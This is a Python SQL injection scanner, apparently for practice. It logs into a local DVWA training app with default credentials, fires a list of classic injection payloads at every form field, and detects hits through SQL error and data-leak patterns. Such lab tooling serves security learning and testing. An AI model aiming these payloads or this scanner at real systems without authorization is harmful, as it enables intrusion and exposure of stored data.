import requests
import json
from bs4 import BeautifulSoup

BASE = "http://localhost:8080/"
LOGIN_URL = BASE + "login.php"

session = requests.Session()

# ---------- LOGIN TO DVWA ----------
def login():

    res = session.get(LOGIN_URL)
    soup = BeautifulSoup(res.text, "html.parser")

    token = soup.find("input", {"name": "user_token"})
    token_value = token["value"] if token else ""

    data = {
        "username": "admin",
        "password": "password",
        "Login": "Login",
        "user_token": token_value
    }

    login = session.post(LOGIN_URL, data=data)

    if "logout.php" in login.text:
        print("Login successful\n")
    else:
        print("Login failed")
        exit()

    # set DVWA security level
    session.cookies.set("security", "low")


# ---------- LOAD FORMS ----------
def load_forms():
    with open("forms.json", "r") as f:
        return json.load(f)


# ---------- SQL PAYLOADS ----------
payloads = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "\" OR \"1\"=\"1",
    "' OR 1=1#",
    "admin'--"
]


# ---------- SQL ERROR PATTERNS ----------
errors = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "mysql_fetch",
    "mysql_num_rows",
    "sql syntax",
    "database error"
]


# ---------- SUCCESS PATTERNS ----------
success_patterns = [
    "first name",
    "surname",
    "user id exists"
]


# ---------- SQLI SCANNER ----------
def scan_forms(forms):

    vulnerabilities = []
    seen = set()

    for form in forms:

        action = form["action"]
        method = form["method"]
        inputs = form["inputs"]

        # skip login form
        if "login.php" in action:
            continue

        print("Scanning Form:", action)

        for payload in payloads:

            data = {}

            for inp in inputs:

                name = inp.get("name")
                if not name:
                    continue

                if inp["type"] == "submit":
                    data[name] = "Submit"
                else:
                    data[name] = payload

            try:

                if method == "post":
                    res = session.post(action, data=data)
                else:
                    res = session.get(action, params=data)

                content = res.text.lower()

                # detect SQL errors OR successful injection results
                if (any(error in content for error in errors) or
                    any(pattern in content for pattern in success_patterns)):

                    key = action + payload
                    if key not in seen:
                        seen.add(key)

                        print("SQL Injection Found!")
                        print("URL:", action)
                        print("Payload:", payload)
                        print()

                        vulnerabilities.append({
                            "type": "SQL Injection",
                            "url": action,
                            "payload": payload
                        })

            except requests.exceptions.RequestException:
                continue

    return vulnerabilities


# ---------- MAIN ----------
login()

forms = load_forms()

print("Starting SQL Injection Scan...\n")

vulnerabilities = scan_forms(forms)

# ---------- SAVE RESULTS ----------
with open("vulnerabilities.json", "w") as f:
    json.dump(vulnerabilities, f, indent=4)

print("Scan Completed")